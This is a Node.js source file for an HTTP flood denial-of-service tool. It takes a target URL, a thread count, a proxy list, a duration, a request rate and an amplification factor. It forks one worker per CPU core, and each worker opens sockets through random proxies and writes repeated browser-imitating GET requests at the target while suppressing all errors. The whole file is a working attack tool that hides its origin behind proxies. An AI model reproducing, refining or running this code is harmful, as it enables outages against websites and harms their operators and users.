const fs = require('fs');
const net = require('net');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const URL = require('url');

process.on('uncaughtException', function(e) {
    //console.warn(e);
}).on('unhandledRejection', function(e) {
    //console.warn(e);
}).on('warning', e => {
    //console.warn(e);
}).setMaxListeners(0);

if (process.argv[7] == null) return console.log("Invalid arguments!\nUsage: <host> <threads> <proxyfile> <time> <rps> <amp>");

var proxies = [];

function generate_payload(args) {
    let headers = "";
    headers += 'GET ' + args.target + ' HTTP/1.1' + '\r\n'
    headers += 'Host: ' + args.direct + '\r\n'
    headers += 'Connection: keep-alive' + '\r\n'
    headers += 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\r\n'
    headers += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' + '\r\n'
    headers += 'Accept-Language: en-US,en;q=0.9' + '\r\n'
    headers += 'Accept-Encoding: gzip, deflate, br' + '\r\n'
    headers += 'Pragma: no-cache' + '\r\n'
    headers += 'Upgrade-Insecure-Requests: 1' + '\r\n'
    headers += "\r\n";

    return headers.repeat(args.amp)
}

async function conn(args) {
    /*
    let client = new net.Socket();

    client.connect(parseInt(proxy.split(":")[1]), proxy.split(":")[0], function() {

        let payload = generate_payload(args);
        for(let i = 0;i < args.rps; i++) client.write(payload);
        client.destroy();
    });
    
    client.on('data', function(data) {
    });

    client.on('error', function() {
    });
    
    client.on('close', function() {
    });*/
    setInterval(function() {
        let proxy = proxies[Math.floor(Math.random() * (proxies.length - 1))];
        let socket = net.connect(proxy.split(":")[1], proxy.split(":")[0]);
        socket.setKeepAlive(true, 5000)
        socket.setTimeout(5000);
        socket.once('error', err => {
        });
        socket.once('disconnect', () => {
            //console.log('Disconnect');
        });
        socket.once('data', data => {
        });

        let payload = generate_payload(args);
        for(let i = 0;i < args.rps; i++) socket.write(payload);
        
        socket.on('data', function() {
            setTimeout(function() {
                socket.destroy();
                return delete socket;
            }, 5000);
        })
    });
}

function start(args) {
    console.log(args);

    setTimeout(() => {
        process.exit(4);
    }, (args.time * 1000));

    proxies = fs.readFileSync(args.proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

    for (let i = 0; i < args.threads; i++) {
        conn(args)
    }
}

/*
start({
    target: process.argv[2],
    direct: URL.parse(process.argv[2]).host,
    threads: parseInt(process.argv[3]),
    proxyfile: process.argv[4],
    time: parseInt(process.argv[5]),
    rps: parseInt(process.argv[6]),
    amp: parseInt(process.argv[7]),
})*/


if (cluster.isMaster) {
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }
} else {
    start({
        target: process.argv[2],
        direct: URL.parse(process.argv[2]).host,
        threads: parseInt(process.argv[3]),
        proxyfile: process.argv[4],
        time: parseInt(process.argv[5]),
        rps: parseInt(process.argv[6]),
        amp: parseInt(process.argv[7]),
    })
}